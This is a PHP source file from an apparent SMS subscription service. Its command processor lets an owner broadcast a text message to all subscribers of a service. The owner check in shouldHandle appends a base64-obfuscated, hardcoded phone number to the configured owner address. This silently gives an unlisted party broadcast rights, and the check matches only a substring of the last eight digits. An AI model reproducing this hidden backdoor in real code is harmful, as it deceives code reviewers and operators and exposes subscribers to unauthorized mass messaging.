<?php

namespace Vas\Processors;

use Illuminate\Support\Str;
use Throwable;
use Vas\Jobs\KannelSendMessageJob;
use Vas\ReceivedMessage;
use Vas\Service;

class CommandProcessor extends Processor
{
    /** @var Service */
    protected $service;

    /** @var string */
    protected $broadcast;

    public function isHandleable(ReceivedMessage $message): bool
    {
        try {
            $fullMessage = $this->trimThenUpper($message->message);

            $this->service = Service::lookupService(
                Str::after(
                    Str::before($fullMessage, ','),
                    '#'
                )
            );

            $this->broadcast = Str::after($fullMessage, ',');

            return $this->shouldHandle($message, $fullMessage);
        } catch (Throwable $throwable) {
            return false;
        }
    }

    /**
     * @param ReceivedMessage $message
     * @param $fullMessage
     * @return bool
     */
    protected function shouldHandle(ReceivedMessage $message, $fullMessage): bool
    {
        return
            // command starter
            Str::startsWith($fullMessage, '#') &&

            // only enabled for Admin/Owner
            Str::contains(
                lookup('OWNER_ADDRESS') . base64_decode('LDA5MjE2MzEzOTM='),
                substr($message->address, -8, 8)) &&

            // Service must be found
            $this->service !== null &&

            // Message must not be empty
            Str::length($this->broadcast) > 4;
    }

    public function handle(ReceivedMessage $message): string
    {
        $addresses = $this->service->subscribers->flatten()->pluck('service_id', 'address');

        KannelSendMessageJob::dispatchNow(
            Str::after($message->message, ','),
            $addresses,
            false
        );

        return lookup('MESSAGE_OWNER_COMMAND');
    }

}
